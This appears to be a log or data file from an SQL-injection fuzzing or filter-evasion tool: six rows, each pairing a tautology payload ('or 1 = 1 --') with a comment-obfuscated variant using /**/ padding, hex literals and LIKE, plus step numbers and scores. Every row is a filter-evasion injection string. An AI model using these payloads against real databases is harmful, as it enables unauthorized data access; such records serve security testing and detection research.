+80;3;25; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;15;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;-2.6594936788082126;0
+81;3;26; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;25;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;-2.7594936788082123;0
+82;3;27; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;18;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;-2.8594936788082124;0
+83;3;28; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;24;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;-2.9594936788082125;0
+84;3;29; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;6;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;-3.0594936788082125;0
+85;3;30; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;12;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;-3.1594936788082126;0
